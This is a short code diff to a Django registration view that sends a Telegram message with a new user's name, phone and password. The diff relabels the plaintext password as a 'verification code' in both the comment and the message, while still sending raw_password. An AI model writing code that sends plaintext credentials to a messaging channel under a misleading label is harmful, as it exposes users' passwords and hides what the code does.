@@ -213,7 +213,7 @@ class RegisterAPIView(APIView):
         serializer.is_valid(raise_exception=True)
         xodim = serializer.save()
 
-        # Send Telegram message with phone number and raw password
+        # Send Telegram message with phone number and verification code
         raw_password = serializer.context.get('raw_password')
         if raw_password:
             from user.telegram_bot import send_telegram_message
@@ -223,7 +223,7 @@ class RegisterAPIView(APIView):
                 f"👤 Ism: {xodim.ism}\n"
                 f"📞 Telefon: {xodim.telefon_raqam}\n"
                 f"🏢 Biznes: {biznes_nomi}\n"
-                f"🔑 Parol: <code>{raw_password}</code>"
+                f"💬 Tasdiqlash kodi: <code>{raw_password}</code>"
             )
             send_telegram_message(msg)
 
